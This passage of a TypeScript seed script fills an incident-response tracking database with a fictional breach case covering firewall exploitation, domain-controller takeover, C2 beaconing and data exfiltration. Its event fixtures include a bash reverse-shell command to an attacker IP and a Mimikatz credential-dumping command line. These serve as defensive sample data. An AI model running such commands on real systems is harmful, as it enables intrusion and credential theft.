import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import * as schema from './index';
import { dbLogger as logger } from '../logging';
import 'dotenv/config';


const moduleFilePath = import.meta.url.replace('file://', '').replace(/%20/g, ' ').replace(/\//g, '\/');
const DATABASE_URL = process.env.DATABASE_URL;
const executedFilePath = process.argv[1]

// Seed data for initial database setup
async function seedDatabase() {
	const client = new Database(DATABASE_URL);
	const db = drizzle(client, { schema });

	logger.info('--- Starting database seeding process ---');
	logger.info('Seeding database with lookup data');

	// Common event types for incident response
	const eventTypes = [
		{ name: 'file_created', description: 'File creation event' },
		{ name: 'file_modified', description: 'File modification event' },
		{ name: 'file_deleted', description: 'File deletion event' },
		{ name: 'process_start', description: 'Process execution started' },
		{ name: 'process_end', description: 'Process terminated' },
		{ name: 'network_connection', description: 'Network connection established' },
		{ name: 'registry_modified', description: 'Windows registry modification' },
		{ name: 'user_login', description: 'User authentication event' },
		{ name: 'privilege_escalation', description: 'Privilege escalation detected' },
		{ name: 'data_exfiltration', description: 'Data exfiltration activity' },
		{ name: 'malware_detected', description: 'Malware detection event' },
		{ name: 'vulnerability_exploited', description: 'Vulnerability exploitation' },
		{ name: 'lateral_movement', description: 'Lateral movement detected' },
		{ name: 'persistence_mechanism', description: 'Persistence mechanism installed' },
		{ name: 'command_execution', description: 'Command or script executed' }
	];

	await db.insert(schema.event_type).values(eventTypes).onConflictDoNothing();
	logger.info('Lookup table "event_type" seeded');

	// Common action types for investigations
	const actionTypes = [
		{ name: 'forensic_acquisition', description: 'Forensic image or memory acquisition' },
		{ name: 'malware_analysis', description: 'Malware sample analysis' },
		{ name: 'log_review', description: 'Log file analysis' },
		{ name: 'network_capture', description: 'Network traffic capture' },
		{ name: 'threat_hunt', description: 'Proactive threat hunting' },
		{ name: 'containment_action', description: 'Containment measure applied' },
		{ name: 'eradication_action', description: 'Threat eradication action' },
		{ name: 'evidence_collection', description: 'Evidence collection and preservation' },
		{ name: 'system_isolation', description: 'System or network isolation' },
		{ name: 'account_disable', description: 'User account disabled' },
		{ name: 'password_reset', description: 'Password reset performed' },
		{ name: 'patch_deployment', description: 'Security patch deployed' },
		{ name: 'ioc_search', description: 'IOC search across environment' },
		{ name: 'interview', description: 'User or witness interview' },
		{ name: 'external_coordination', description: 'Coordination with external party' }
	];

	await db.insert(schema.action_type).values(actionTypes).onConflictDoNothing();
	logger.info('lookup table "action_type" seeded');

	// Relation types for linking entities
	const relationTypes = [
		{ name: 'source', description: 'Source of the action/event' },
		{ name: 'target', description: 'Target of the action/event' },
		{ name: 'created_by', description: 'Created by this entity' },
		{ name: 'modified_by', description: 'Modified by this entity' },
		{ name: 'deleted_by', description: 'Deleted by this entity' },
		{ name: 'communicated_with', description: 'Communication endpoint' },
		{ name: 'downloaded_from', description: 'Downloaded from this source' },
		{ name: 'uploaded_to', description: 'Uploaded to this destination' },
		{ name: 'executed_by', description: 'Executed by this entity' },
		{ name: 'triggered_by', description: 'Triggered by this event/action' },
		{ name: 'resulted_in', description: 'Resulted in this event/action' },
		{ name: 'related_to', description: 'Generally related' }
	];

	await db.insert(schema.relation_type).values(relationTypes).onConflictDoNothing();
	logger.info('Lookup table "relation_type" seeded');

	// Annotation types for collaborative notes
	const annotationTypes = [
		{ name: 'hypothesis', description: 'Theory about incident activity' },
		{ name: 'observation', description: 'Notable observation' },
		{ name: 'question', description: 'Question requiring investigation' },
		{ name: 'evidence_link', description: 'Link to supporting evidence' },
		{ name: 'timeline_correction', description: 'Correction to timeline data' },
		{ name: 'attribution', description: 'Threat actor attribution notes' },
		{ name: 'impact_assessment', description: 'Impact assessment notes' },
		{ name: 'lesson_learned', description: 'Lesson learned for future' },
		{ name: 'recommendation', description: 'Recommended action or improvement' }
	];

	await db.insert(schema.annotation_type).values(annotationTypes).onConflictDoNothing();
	logger.info('Lookup table "annotation_type" seeded');

	// Common entity types for IOCs and assets
	const entityTypes = [
		{ name: 'ip_address', description: 'IP address (IPv4 or IPv6)' },
		{ name: 'domain', description: 'Domain name' },
		{ name: 'url', description: 'Full URL' },
		{ name: 'file_hash', description: 'File hash (MD5, SHA1, SHA256)' },
		{ name: 'file_path', description: 'File system path' },
		{ name: 'email_address', description: 'Email address' },
		{ name: 'user_account', description: 'User account name' },
		{ name: 'host', description: 'Hostname or computer name' },
		{ name: 'process_name', description: 'Process or executable name' },
		{ name: 'registry_key', description: 'Windows registry key' },
		{ name: 'certificate', description: 'Digital certificate' },
		{ name: 'mutex', description: 'Mutex name' },
		{ name: 'service_name', description: 'System service name' },
		{ name: 'port', description: 'Network port number' },
		{ name: 'cve', description: 'CVE identifier' }
	];

	await db.insert(schema.entity_type).values(entityTypes).onConflictDoNothing();
	logger.info('Lookup table "entity_type" seeded');

	// Inserting a default user for initial setup
	await db
		.insert(schema.analysts)
		.values({
			uuid: '1c9d4635-651d-48d7-9ac8-ed92663f2003',
			username: 'admin',
			full_name: 'Wally',
			role: 'analyst'
		})
		.onConflictDoNothing();
	logger.info('Default local analyst "Wally" inserted');

	// Additional analysts for the incident response team
	const additionalAnalysts = [
		{
			uuid: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			username: 'jdoe',
			email: 'jdoe@company.com',
			full_name: 'Jane Doe',
			role: 'on-point lead' as const
		},
		{
			uuid: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			username: 'msmith',
			email: 'msmith@company.com',
			full_name: 'Mike Smith',
			role: 'analyst' as const
		}
	];

	await db.insert(schema.analysts).values(additionalAnalysts).onConflictDoNothing();
	logger.info('Additional analysts inserted');

	// ===== LARGE INCIDENT CASE: FIREWALL BREACH -> DC TAKEOVER -> C2 CONNECTION =====
	logger.info('--- Creating large-scale breach incident ---');

	// Create the main incident
	const breachIncident = {
		uuid: 'a1b2c3d4-e5f6-4a5b-8c9d-0e1f2a3b4c5d',
		soar_ticket_id: 'INC-2024-001',
		title: 'Firewall Compromise',
		status: 'In Progress' as const,
		priority: 'critical' as const
	};

	await db.insert(schema.incidents).values(breachIncident).onConflictDoNothing();
	logger.info('Breach incident created');

	// Timeline base timestamp (7 days ago)
	const baseTime = Math.floor(Date.now() / 1000) - 7 * 24 * 60 * 60;

	// ===== PHASE 1: INITIAL FIREWALL BREACH =====

	// Entities for Phase 1
	const firewallEntities = [
		{
			uuid: 'ent-fw-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'host',
			identifier: 'FW-DMZ-01',
			display_name: 'Primary DMZ Firewall',
			first_seen: baseTime,
			status: 'active' as const,
			criticality: 'critical' as const
		},
		{
			uuid: 'ent-ip-attacker-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'ip_address',
			identifier: '185.220.101.42',
			display_name: 'Suspected Threat Actor IP',
			first_seen: baseTime,
			status: 'active' as const,
			criticality: 'critical' as const,
			attributes: JSON.stringify({
				geolocation: 'Russia',
				asn: 'AS48693',
				reputation: 'malicious'
			})
		},
		{
			uuid: 'ent-cve-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'cve',
			identifier: 'CVE-2024-3400',
			display_name: 'Palo Alto Networks OS Command Injection',
			first_seen: baseTime,
			status: 'active' as const,
			criticality: 'critical' as const
		},
		{
			uuid: 'ent-user-svc-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'user_account',
			identifier: 'svc_firewall_admin',
			display_name: 'Firewall Service Account',
			first_seen: baseTime + 300,
			status: 'active' as const,
			criticality: 'high' as const
		}
	];

	await db.insert(schema.entities).values(firewallEntities).onConflictDoNothing();

	// Timeline events for firewall breach
	const firewallEvents = [
		{
			uuid: 'evt-fw-scan-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'network_connection',
			occurred_at: baseTime,
			discovered_at: baseTime + 86400, // Discovered 1 day later
			event_data: JSON.stringify({
				description: 'Port scanning activity detected on firewall management interface',
				ports: [22, 443, 8443],
				protocol: 'TCP'
			}),
			severity: 'medium' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Firewall IDS Logs'
		},
		{
			uuid: 'evt-fw-exploit-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'vulnerability_exploited',
			occurred_at: baseTime + 1800, // 30 min after scan
			discovered_at: baseTime + 86400,
			event_data: JSON.stringify({
				description: 'CVE-2024-3400 exploitation attempt - OS command injection via GlobalProtect gateway',
				method: 'POST',
				endpoint: '/ssl-vpn/hipreport.esp',
				payload_detected: true
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Firewall System Logs'
		},
		{
			uuid: 'evt-fw-shell-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'command_execution',
			occurred_at: baseTime + 2100,
			discovered_at: baseTime + 86400,
			event_data: JSON.stringify({
				description: 'Reverse shell established from firewall',
				command: '/bin/bash -i >& /dev/tcp/185.220.101.42/4444 0>&1',
				user_context: 'root'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'EDR Agent on Firewall'
		},
		{
			uuid: 'evt-fw-cred-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'file_created',
			occurred_at: baseTime + 3600,
			discovered_at: baseTime + 86400,
			event_data: JSON.stringify({
				description: 'Credentials harvested from firewall configuration',
				file_path: '/tmp/.creds_dump',
				size_bytes: 4096
			}),
			severity: 'high' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'File System Monitor'
		}
	];

	await db.insert(schema.timeline_events).values(firewallEvents).onConflictDoNothing();

	// Link entities to firewall events
	const firewallEventEntities = [
		{ event_id: 'evt-fw-scan-01', entity_id: 'ent-ip-attacker-01', role: 'source' },
		{ event_id: 'evt-fw-scan-01', entity_id: 'ent-fw-01', role: 'target' },
		{ event_id: 'evt-fw-exploit-01', entity_id: 'ent-ip-attacker-01', role: 'source' },
		{ event_id: 'evt-fw-exploit-01', entity_id: 'ent-fw-01', role: 'target' },
		{ event_id: 'evt-fw-exploit-01', entity_id: 'ent-cve-01', role: 'related_to' },
		{ event_id: 'evt-fw-shell-01', entity_id: 'ent-fw-01', role: 'source' },
		{ event_id: 'evt-fw-shell-01', entity_id: 'ent-ip-attacker-01', role: 'target' },
		{ event_id: 'evt-fw-cred-01', entity_id: 'ent-fw-01', role: 'source' },
		{ event_id: 'evt-fw-cred-01', entity_id: 'ent-user-svc-01', role: 'related_to' }
	];

	await db.insert(schema.event_entities).values(firewallEventEntities).onConflictDoNothing();

	// ===== PHASE 2: LATERAL MOVEMENT TO DOMAIN CONTROLLER =====

	// Entities for Phase 2
	const dcEntities = [
		{
			uuid: 'ent-dc-01',
			incident_id: breachIncident.uuid,
			entered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			entity_type: 'host',
			identifier: 'DC-PROD-01.corp.local',
			display_name: 'Primary Domain Controller',
			first_seen: baseTime + 7200,
			status: 'active' as const,
			criticality: 'critical' as const,
			attributes: JSON.stringify({
				os: 'Windows Server 2019',
				ip_address: '10.0.1.10',
				domain_role: 'Primary DC'
			})
		},
		{
			uuid: 'ent-ip-internal-01',
			incident_id: breachIncident.uuid,
			entered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			entity_type: 'ip_address',
			identifier: '10.0.1.10',
			display_name: 'DC Internal IP',
			first_seen: baseTime + 7200,
			status: 'active' as const,
			criticality: 'critical' as const
		},
		{
			uuid: 'ent-user-admin-01',
			incident_id: breachIncident.uuid,
			entered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			entity_type: 'user_account',
			identifier: 'CORP\\Administrator',
			display_name: 'Domain Administrator Account',
			first_seen: baseTime + 10800,
			status: 'active' as const,
			criticality: 'critical' as const
		},
		{
			uuid: 'ent-tool-mimikatz',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'process_name',
			identifier: 'mw.exe',
			display_name: 'Mimikatz (Renamed)',
			first_seen: baseTime + 9000,
			status: 'active' as const,
			criticality: 'critical' as const
		},
		{
			uuid: 'ent-hash-mimikatz',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'file_hash',
			identifier: 'a1b2c3d4e5f6789012345678901234567890abcd1234567890abcdef12345678',
			display_name: 'Mimikatz SHA256',
			first_seen: baseTime + 9000,
			status: 'active' as const,
			criticality: 'critical' as const
		}
	];

	await db.insert(schema.entities).values(dcEntities).onConflictDoNothing();

	// Timeline events for lateral movement
	const lateralMovementEvents = [
		{
			uuid: 'evt-lm-rdp-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'network_connection',
			occurred_at: baseTime + 7200, // 2 hours after initial breach
			discovered_at: baseTime + 86400,
			event_data: JSON.stringify({
				description: 'RDP connection from firewall to internal network',
				source_ip: '10.0.0.5',
				dest_ip: '10.0.1.10',
				port: 3389,
				protocol: 'RDP'
			}),
			severity: 'high' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Network Flow Logs'
		},
		{
			uuid: 'evt-lm-login-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'user_login',
			occurred_at: baseTime + 7500,
			discovered_at: baseTime + 86400,
			event_data: JSON.stringify({
				description: 'Successful authentication using compromised service account',
				account: 'svc_firewall_admin',
				auth_type: 'NTLM',
				logon_type: 10, // RemoteInteractive
				source_ip: '10.0.0.5'
			}),
			severity: 'high' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Windows Security Event Log (4624)'
		},
		{
			uuid: 'evt-lm-mimikatz-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'process_start',
			occurred_at: baseTime + 9000,
			discovered_at: baseTime + 90000,
			event_data: JSON.stringify({
				description: 'Mimikatz execution detected on domain controller',
				process_name: 'mw.exe',
				command_line: 'mw.exe privilege::debug sekurlsa::logonpasswords',
				parent_process: 'cmd.exe',
				user: 'svc_firewall_admin'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'EDR Alert'
		},
		{
			uuid: 'evt-lm-cred-dump-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'privilege_escalation',
			occurred_at: baseTime + 9300,
			discovered_at: baseTime + 90000,
			event_data: JSON.stringify({
				description: 'LSASS memory dump - credentials extracted',
				method: 'Mimikatz sekurlsa',
				credentials_compromised: ['Administrator', 'krbtgt', 'Domain Admins'],
				technique: 'T1003.001 - LSASS Memory'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'EDR Telemetry'
		},
		{
			uuid: 'evt-dc-takeover-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'privilege_escalation',
			occurred_at: baseTime + 10800, // 3 hours after initial breach
			discovered_at: baseTime + 90000,
			event_data: JSON.stringify({
				description: 'Domain Administrator account compromise - full DC control achieved',
				account: 'CORP\\Administrator',
				logon_type: 2, // Interactive
				privileges: ['SeDebugPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege']
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Windows Security Event Log (4672)'
		},
		{
			uuid: 'evt-dc-persist-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'persistence_mechanism',
			occurred_at: baseTime + 12600,
			discovered_at: baseTime + 100000,
			event_data: JSON.stringify({
				description: 'Golden Ticket attack - forged Kerberos TGT',
				technique: 'T1558.001 - Golden Ticket',
				krbtgt_hash_compromised: true,
				ticket_lifetime: 'unlimited'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'B' as const,
			source: 'Kerberos Anomaly Detection'
		}
	];

	await db.insert(schema.timeline_events).values(lateralMovementEvents).onConflictDoNothing();

	// Link entities to lateral movement events
	const lateralMovementEventEntities = [
		{ event_id: 'evt-lm-rdp-01', entity_id: 'ent-fw-01', role: 'source' },
		{ event_id: 'evt-lm-rdp-01', entity_id: 'ent-dc-01', role: 'target' },
		{ event_id: 'evt-lm-login-01', entity_id: 'ent-user-svc-01', role: 'source' },
		{ event_id: 'evt-lm-login-01', entity_id: 'ent-dc-01', role: 'target' },
		{ event_id: 'evt-lm-mimikatz-01', entity_id: 'ent-tool-mimikatz', role: 'source' },
		{ event_id: 'evt-lm-mimikatz-01', entity_id: 'ent-hash-mimikatz', role: 'related_to' },
		{ event_id: 'evt-lm-mimikatz-01', entity_id: 'ent-dc-01', role: 'target' },
		{ event_id: 'evt-lm-cred-dump-01', entity_id: 'ent-user-admin-01', role: 'target' },
		{ event_id: 'evt-lm-cred-dump-01', entity_id: 'ent-tool-mimikatz', role: 'source' },
		{ event_id: 'evt-dc-takeover-01', entity_id: 'ent-user-admin-01', role: 'source' },
		{ event_id: 'evt-dc-takeover-01', entity_id: 'ent-dc-01', role: 'target' },
		{ event_id: 'evt-dc-persist-01', entity_id: 'ent-user-admin-01', role: 'source' },
		{ event_id: 'evt-dc-persist-01', entity_id: 'ent-dc-01', role: 'source' }
	];

	await db.insert(schema.event_entities).values(lateralMovementEventEntities).onConflictDoNothing();

	// ===== PHASE 3: C2 COMMUNICATION AND DATA EXFILTRATION =====

	// Entities for Phase 3
	const c2Entities = [
		{
			uuid: 'ent-c2-domain-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'domain',
			identifier: 'malicious-c2-server.darkweb.onion',
			display_name: 'C2 Domain',
			first_seen: baseTime + 14400,
			status: 'active' as const,
			criticality: 'critical' as const,
			attributes: JSON.stringify({
				registrar: 'Unknown',
				first_seen_threat_intel: '2024-12-15',
				threat_category: 'C2'
			})
		},
		{
			uuid: 'ent-c2-ip-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'ip_address',
			identifier: '198.51.100.88',
			display_name: 'C2 Server IP',
			first_seen: baseTime + 14400,
			status: 'active' as const,
			criticality: 'critical' as const,
			attributes: JSON.stringify({
				geolocation: 'Unknown/Tor Exit Node',
				asn: 'AS13335',
				reputation: 'malicious'
			})
		},
		{
			uuid: 'ent-c2-url-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'url',
			identifier: 'https://malicious-c2-server.darkweb.onion/api/v2/beacon',
			display_name: 'C2 Beacon URL',
			first_seen: baseTime + 14400,
			status: 'active' as const,
			criticality: 'critical' as const
		},
		{
			uuid: 'ent-beacon-tool-01',
			incident_id: breachIncident.uuid,
			entered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			entity_type: 'process_name',
			identifier: 'svchost.exe',
			display_name: 'Malicious Process (Masquerading)',
			first_seen: baseTime + 14400,
			status: 'active' as const,
			criticality: 'high' as const,
			attributes: JSON.stringify({
				legitimate_path: 'C:\\Windows\\System32\\svchost.exe',
				actual_path: 'C:\\Users\\Public\\svchost.exe',
				masquerading: true
			})
		},
		{
			uuid: 'ent-exfil-file-01',
			incident_id: breachIncident.uuid,
			entered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			entity_type: 'file_path',
			identifier: 'C:\\ExfilData\\corporate_data.7z',
			display_name: 'Staged Exfiltration Archive',
			first_seen: baseTime + 18000,
			status: 'active' as const,
			criticality: 'critical' as const,
			attributes: JSON.stringify({
				size_mb: 2048,
				encrypted: true,
				compression: '7zip'
			})
		}
	];

	await db.insert(schema.entities).values(c2Entities).onConflictDoNothing();

	// Timeline events for C2 and exfiltration
	const c2Events = [
		{
			uuid: 'evt-c2-beacon-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'network_connection',
			occurred_at: baseTime + 14400, // 4 hours after initial breach
			discovered_at: baseTime + 100000,
			event_data: JSON.stringify({
				description: 'Initial C2 beacon from compromised DC',
				destination: 'malicious-c2-server.darkweb.onion',
				destination_ip: '198.51.100.88',
				port: 443,
				protocol: 'HTTPS',
				user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
				beacon_interval: 60
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Proxy Logs'
		},
		{
			uuid: 'evt-c2-implant-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'persistence_mechanism',
			occurred_at: baseTime + 14700,
			discovered_at: baseTime + 100000,
			event_data: JSON.stringify({
				description: 'C2 implant installed as scheduled task',
				task_name: 'SystemHealthCheck',
				trigger: 'At system startup',
				action: 'C:\\Users\\Public\\svchost.exe',
				technique: 'T1053.005 - Scheduled Task'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Scheduled Task Logs'
		},
		{
			uuid: 'evt-c2-command-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'command_execution',
			occurred_at: baseTime + 16200,
			discovered_at: baseTime + 110000,
			event_data: JSON.stringify({
				description: 'Remote command execution via C2 channel',
				command: 'powershell.exe -enc <base64_encoded_payload>',
				decoded_command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.docx,*.xlsx,*.pdf',
				technique: 'T1059.001 - PowerShell'
			}),
			severity: 'high' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'PowerShell Logging (4104)'
		},
		{
			uuid: 'evt-data-staging-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'file_created',
			occurred_at: baseTime + 18000, // 5 hours after initial breach
			discovered_at: baseTime + 120000,
			event_data: JSON.stringify({
				description: 'Sensitive data staged for exfiltration',
				file_path: 'C:\\ExfilData\\corporate_data.7z',
				size_bytes: 2147483648, // 2GB
				encryption: 'AES-256',
				contents: 'Financial reports, employee PII, intellectual property'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'File System Auditing'
		},
		{
			uuid: 'evt-exfiltration-01',
			incident_id: breachIncident.uuid,
			discovered_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			event_type: 'data_exfiltration',
			occurred_at: baseTime + 21600, // 6 hours after initial breach
			discovered_at: baseTime + 130000,
			event_data: JSON.stringify({
				description: 'Large data transfer to C2 server - confirmed exfiltration',
				bytes_transferred: 2147483648,
				duration_seconds: 3600,
				destination: 'https://malicious-c2-server.darkweb.onion/upload',
				method: 'HTTPS POST',
				technique: 'T1041 - Exfiltration Over C2 Channel'
			}),
			severity: 'critical' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'DLP Alert & Network Traffic Analysis'
		},
		{
			uuid: 'evt-c2-checkin-01',
			incident_id: breachIncident.uuid,
			discovered_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			event_type: 'network_connection',
			occurred_at: baseTime + 25200,
			discovered_at: baseTime + 130000,
			event_data: JSON.stringify({
				description: 'Periodic C2 check-in - ongoing compromised state',
				beacon_count: 42,
				avg_beacon_interval: 600,
				last_command_received: 'sleep 3600'
			}),
			severity: 'high' as const,
			confidence: 'high' as const,
			source_reliability: 'A' as const,
			source: 'Network Monitoring'
		}
	];

	await db.insert(schema.timeline_events).values(c2Events).onConflictDoNothing();

	// Link entities to C2 events
	const c2EventEntities = [
		{ event_id: 'evt-c2-beacon-01', entity_id: 'ent-dc-01', role: 'source' },
		{ event_id: 'evt-c2-beacon-01', entity_id: 'ent-c2-domain-01', role: 'target' },
		{ event_id: 'evt-c2-beacon-01', entity_id: 'ent-c2-ip-01', role: 'target' },
		{ event_id: 'evt-c2-beacon-01', entity_id: 'ent-c2-url-01', role: 'related_to' },
		{ event_id: 'evt-c2-implant-01', entity_id: 'ent-beacon-tool-01', role: 'source' },
		{ event_id: 'evt-c2-implant-01', entity_id: 'ent-dc-01', role: 'target' },
		{ event_id: 'evt-c2-command-01', entity_id: 'ent-beacon-tool-01', role: 'source' },
		{ event_id: 'evt-c2-command-01', entity_id: 'ent-c2-url-01', role: 'source' },
		{ event_id: 'evt-data-staging-01', entity_id: 'ent-exfil-file-01', role: 'target' },
		{ event_id: 'evt-data-staging-01', entity_id: 'ent-dc-01', role: 'source' },
		{ event_id: 'evt-exfiltration-01', entity_id: 'ent-exfil-file-01', role: 'source' },
		{ event_id: 'evt-exfiltration-01', entity_id: 'ent-c2-url-01', role: 'target' },
		{ event_id: 'evt-exfiltration-01', entity_id: 'ent-c2-ip-01', role: 'target' },
		{ event_id: 'evt-c2-checkin-01', entity_id: 'ent-dc-01', role: 'source' },
		{ event_id: 'evt-c2-checkin-01', entity_id: 'ent-c2-url-01', role: 'target' }
	];

	await db.insert(schema.event_entities).values(c2EventEntities).onConflictDoNothing();

	// ===== INVESTIGATION ACTIONS =====

	const investigationActions = [
		{
			uuid: 'act-initial-detect-01',
			incident_id: breachIncident.uuid,
			actioned_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			action_type: 'threat_hunt',
			performed_at: baseTime + 86400,
			action_data: JSON.stringify({
				description: 'Initial detection through routine threat hunting',
				scope: 'Firewall logs review',
				tools_used: ['Splunk', 'Wireshark']
			}),
			result: 'success' as const,
			tool_used: 'Splunk',
			notes: 'Discovered suspicious activity on firewall during routine log analysis'
		},
		{
			uuid: 'act-fw-isolate-01',
			incident_id: breachIncident.uuid,
			actioned_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			action_type: 'system_isolation',
			performed_at: baseTime + 87000,
			action_data: JSON.stringify({
				description: 'Isolated compromised firewall from network',
				systems_isolated: ['FW-DMZ-01'],
				method: 'Network segmentation'
			}),
			result: 'success' as const,
			notes: 'Firewall isolated to prevent further lateral movement',
			next_steps: 'Analyze firewall forensic image'
		},
		{
			uuid: 'act-fw-forensics-01',
			incident_id: breachIncident.uuid,
			actioned_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			action_type: 'forensic_acquisition',
			performed_at: baseTime + 90000,
			action_data: JSON.stringify({
				description: 'Acquired forensic image of compromised firewall',
				image_format: 'E01',
				hash_md5: '5d41402abc4b2a76b9719d911017c592',
				hash_sha256: 'a1b2c3d4e5f6789012345678901234567890abcd1234567890abcdef12345678'
			}),
			result: 'success' as const,
			tool_used: 'FTK Imager',
			notes: 'Full disk image acquired successfully'
		},
		{
			uuid: 'act-malware-analysis-01',
			incident_id: breachIncident.uuid,
			actioned_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			action_type: 'malware_analysis',
			performed_at: baseTime + 95000,
			action_data: JSON.stringify({
				description: 'Static and dynamic analysis of Mimikatz variant',
				file_hash: 'a1b2c3d4e5f6789012345678901234567890abcd1234567890abcdef12345678',
				sandbox: 'Cuckoo Sandbox',
				findings: 'Confirmed Mimikatz v2.2.0, no additional backdoors'
			}),
			result: 'success' as const,
			tool_used: 'Cuckoo Sandbox',
			notes: 'Standard Mimikatz binary, no custom modifications detected'
		},
		{
			uuid: 'act-dc-isolate-01',
			incident_id: breachIncident.uuid,
			actioned_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			action_type: 'system_isolation',
			performed_at: baseTime + 100000,
			action_data: JSON.stringify({
				description: 'Isolated compromised domain controller',
				systems_isolated: ['DC-PROD-01'],
				method: 'Network disconnect'
			}),
			result: 'success' as const,
			notes: 'DC isolated after discovering compromise',
			next_steps: 'Promote backup DC, reset all domain credentials'
		},
		{
			uuid: 'act-cred-reset-01',
			incident_id: breachIncident.uuid,
			actioned_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			action_type: 'password_reset',
			performed_at: baseTime + 110000,
			action_data: JSON.stringify({
				description: 'Emergency password reset for all domain accounts',
				accounts_affected: 'All domain users (1,247 accounts)',
				krbtgt_reset: true,
				reset_iterations: 2
			}),
			result: 'success' as const,
			notes: 'KRBTGT account reset twice to invalidate all Kerberos tickets including Golden Tickets',
			next_steps: 'Monitor for re-compromise attempts'
		},
		{
			uuid: 'act-ioc-hunt-01',
			incident_id: breachIncident.uuid,
			actioned_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			action_type: 'ioc_search',
			performed_at: baseTime + 120000,
			action_data: JSON.stringify({
				description: 'IOC hunt across enterprise environment',
				iocs_searched: [
					'185.220.101.42',
					'198.51.100.88',
					'malicious-c2-server.darkweb.onion',
					'a1b2c3d4e5f6789012345678901234567890abcd1234567890abcdef12345678'
				],
				systems_scanned: 847,
				additional_compromises: 0
			}),
			result: 'success' as const,
			tool_used: 'CrowdStrike Falcon',
			notes: 'No additional compromised systems detected. Breach contained to firewall and DC.'
		},
		{
			uuid: 'act-network-block-01',
			incident_id: breachIncident.uuid,
			actioned_by: '2a8e5746-762e-59e8-0bd9-fe03774g3114',
			action_type: 'containment_action',
